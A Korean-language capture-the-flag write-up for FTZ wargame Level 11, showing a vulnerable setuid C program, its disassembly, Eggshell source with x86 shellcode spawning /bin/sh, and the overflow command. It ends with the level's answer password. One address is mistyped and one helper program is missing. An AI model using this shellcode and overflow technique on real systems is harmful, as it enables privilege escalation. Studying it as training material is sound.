@@ -1,0 +1,164 @@
+#================================================================================#
+#FTZ Level 11
+hint)
+#include <stdio.h>
+#include <stdlib.h>
+ 
+int main( int argc, char *argv[] )
+{
+	char str[256];
+
+ 	setreuid( 3092, 3092 );
+	strcpy( str, argv[1] );
+	printf( str );
+} 
+
+
+#FTZ Level 11 풀이 과정)
+find / -user level12 -perm -4000 2>/dev/null ->
+/home/level11/attackme
+홈디렉토리에 attackme 라는 녀석이 있는데, Setuid를 가지고 있다.
+실행해보니 Segmentation fault라고 하며 끝.
+
+일단 해당 소스코드를 직접 까보자.
+
+
+0x08048394 <main+0>:	push   ebp
+0x08048395 <main+1>:	mov    ebp,esp
+0x08048397 <main+3>:	sub    esp,0x108
+0x0804839d <main+9>:	and    esp,0xfffffff0
+0x080483a0 <main+12>:	mov    eax,0x0
+0x080483a5 <main+17>:	sub    esp,eax
+0x080483a7 <main+19>:	sub    esp,0x8
+0x080483aa <main+22>:	push   0xc14
+0x080483af <main+27>:	push   0xc14
+0x080483b4 <main+32>:	call   0x80482c4 <setreuid>
+0x080483b9 <main+37>:	add    esp,0x10
+0x080483bc <main+40>:	sub    esp,0x8
+0x080483bf <main+43>:	mov    eax,DWORD PTR [ebp+12]
+0x080483c2 <main+46>:	add    eax,0x4
+0x080483c5 <main+49>:	push   DWORD PTR [eax]
+0x080483c7 <main+51>:	lea    eax,[ebp-264]
+0x080483cd <main+57>:	push   eax
+0x080483ce <main+58>:	call   0x80482d4 <strcpy>
+0x080483d3 <main+63>:	add    esp,0x10
+0x080483d6 <main+66>:	sub    esp,0xc
+0x080483d9 <main+69>:	lea    eax,[ebp-264]
+0x080483df <main+75>:	push   eax
+0x080483e0 <main+76>:	call   0x80482b4 <printf>
+0x080483e5 <main+81>:	add    esp,0x10
+0x080483e8 <main+84>:	leave  
+0x080483e9 <main+85>:	ret    
+0x080483ea <main+86>:	nop    
+0x080483eb <main+87>:	nop    
+
+264바이트를 스택의 공간에 만들어 주는 것을 볼 수 있다.
+dummy 때문에 8바이트가 늘어났다.
+그럼 A를 264번 반복해서 넣어주고, 그 이후에 EIP가 가르킬 주소를 넣어주면 되겠다.
+근데 EIP가 가르켜서 실행시킬 주소를 알아내는게 어려운데 쉽게 해결하는 방법이
+Eggshell이라는 소스였다.
+EggShell이라는 소스를 가져와서 컴파일 시켜서 실행시키면 EGGShell이 실행되며 그 환경변수의 주소값을 주는데
+Eggshell이라는 소스 코드를 보면 /bin/bash라는 소스코드가 적혀있다.
+setreuid 파일 내에 있으니 쉘만 실행시켜주면 그 권한으로 쉘이 실행되겠다.
+
+#include <stdlib.h>
+#define DEFAULT_OFFSET 0
+#define DEFAULT_BUFFER_SIZE 512
+#define DEFAULT_EGG_SIZE 2048
+#define NOP 0x90
+char shellcode[] =
+"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80"
+"\x55\x89\xe5\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46"
+"\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89"
+"\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
+"\x00\xc9\xc3\x90/bin/sh";
+unsigned long get_esp(void) {
+	__asm__("movl %esp,%eax");
+}                   
+
+int main(int argc, char *argv[]) {
+	char *buff, *ptr, *egg;
+	long *addr_ptr, addr;
+	int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+	int i, eggsize=DEFAULT_EGG_SIZE;
+	if(argc > 1) bsize = atoi(argv[1]);
+	if(argc > 2) offset = atoi(argv[2]); 
+	if(argc > 3) eggsize = atoi(argv[3]); 
+	if(!(buff = malloc(bsize))) {   
+		printf("Can't allocate memory.\n"); 
+		exit(0);                                
+	}                                                   
+	if(!(egg = malloc(eggsize))) {      
+		printf("Can't allocate memory.\n");         
+		exit(0);                                            
+	}                                                               
+	addr = get_esp() - offset;          
+	printf("Using address: 0x%x\n", addr);  
+	ptr = buff;                                 
+	addr_ptr = (long *) ptr;                        
+	for(i = 0; i < bsize; i+=4)                         
+		*(addr_ptr++) = addr;                                       
+	ptr = egg;                                              
+	for(i = 0; i < eggsize - strlen(shellcode) - 1; i++)        
+		*(ptr++) = NOP;                                                     
+	for(i = 0; i < strlen(shellcode); i++)                          
+		*(ptr++) = shellcode[i];                                                
+	buff[bsize - 1] = '\0';                                             
+	egg[eggsize - 1] = '\0';
+	memcpy(egg,"EGG=",4);
+	putenv(egg);
+	memcpy(buff,"RET=",4);
+	putenv(buff);
+	system("/bin/bash");
+	return 0;
+}
+
+EGGSHELL 소스코드다.
+EGGSHELL에서 나온 주소값을 리틀 엔디언 방식으로 작성해서 붙여 넣기 해주면 끝.
+
+./attackme $(python -c 'print("A"*264+"\xb8\xf3\xff\bf"))
+
+근데 쉘이 적용되질 않았다. 그이유가.
+ebp가 ret전에 있었다. 4바이트를 추가해서
+
+./attackme $(python -c 'print("A"*268+"\xb8\xf3\xff\bf"))
+여전히 오류.
+무슨 문제인가 했더니, 환경변수의 주소가 틀렸다.
+
+#include <stdio.h>
+
+
+
+
+이란 소스를 가져와서 에그 실행 후 실행시켜주면 eggshell의 주소값을 정확히 가져온다. (참고 자료 : https://blog.dork94.com/99?category=749219)
+
+제대로 명령이 실행되지 않았던 이유 :
+putenv의 특징은 다음과 같습니다.
+환경 변수 목록 중에 변수값을 수정하거나 추가합니다.
+그러나 수정된 변수값이나 새로 추가된 환경 변수값은
+실행 중인 프로그램에서만 유효하며 외부적으로는 변경되지 않습니다.
+즉, 프로그램의 실행 단위인 애플리케이션 내에서만 유효합니다.
+그 이유는 바로 프로그램 실행시 CRT(C RunTime libray)가 환경변수 포인터 (envp)값을 관리하는 environ List로 복사를 하게 됩니다.
+이때, envp를 바꿔도 CRT가 해당 포인터를 list로 복사해주지 않기 때문에 적용이 되지 않습니다.
+따라서, putenv는 환경변수를 적용시키기 위해 환경변수 포인터를 이용하는 것이 아닌 environ List에 복사를 하게 되는 것이며 이 List는 프로그램 내에서만 유효하게 되는 것 입니다(CRT가 envp를 이용해 불러들인 저장된 값이 아니기 때문이죠. 환경변수를 추가하려면 export 명령어를 이용하며 envp를 추가 가능합니다).
+때문에 environ List가 유효한 프로그램 내에서 eggshell을 실행 시킬 수 밖에 없는 것 이지요! 
+
+
+my-pass로 답을 얻어오면 된다.
+
+추후에 알게 된 사실인데, 어셈블리어를 분석해서 얼만큼의 공간이 있는 것보다.
+문자열의 크기를 보고 대충 때려박은 다음에 +1씩 늘려가는 스크립트를 작성하는게 더 편하다고 하더라.
+야매가 더 쉽고 정확하다고 한다.
+
+
+
+답 == it is like this
+
+
+
+
+
+
+
+
+
